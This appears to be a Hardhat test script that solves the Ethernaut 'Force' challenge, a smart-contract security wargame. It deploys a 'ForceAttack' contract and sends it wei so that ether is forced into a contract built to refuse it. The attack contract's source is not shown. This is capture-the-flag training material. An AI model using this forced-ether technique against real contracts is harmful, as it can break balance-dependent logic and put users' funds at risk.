import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;
let attackContract: Contract;


describe.only("Force", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("Force");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await contractFactory.attach(challengeAddr);

        const attackContractFactory = await ethers.getContractFactory("ForceAttack");
        attackContract = await attackContractFactory.deploy(contract.address);
    });

    it("Should solve the challenge", async function () {

        expect(await submitInstance(contract.address)).to.be.false;

        const forceTransaction = {
            to: attackContract.address,
            value: ethers.utils.parseUnits("100000", "wei"),
        };
        txn = await owner.sendTransaction(forceTransaction);
        await txn.wait();

        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});